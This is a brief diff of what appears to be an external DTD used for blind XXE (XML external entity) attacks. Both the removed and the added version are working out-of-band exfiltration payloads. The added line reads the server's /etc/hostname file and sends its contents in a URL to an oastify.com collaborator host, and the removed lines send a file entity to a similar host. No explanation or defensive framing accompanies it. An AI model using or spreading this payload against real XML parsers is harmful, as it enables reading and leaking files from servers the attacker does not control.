@@ -1,2 +1,1 @@
-<!ENTITY % all "<!ENTITY send SYSTEM 'https://gl5ki7mltfc9kqu8seqal8a81z7qviq6f.oastify.com//?collect=%file;'>">
-%all;
+<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://mb1q8dcrjl2fawkeikggbe0er5xwlohc6.oastify.com/?x=%file;'>">%eval;
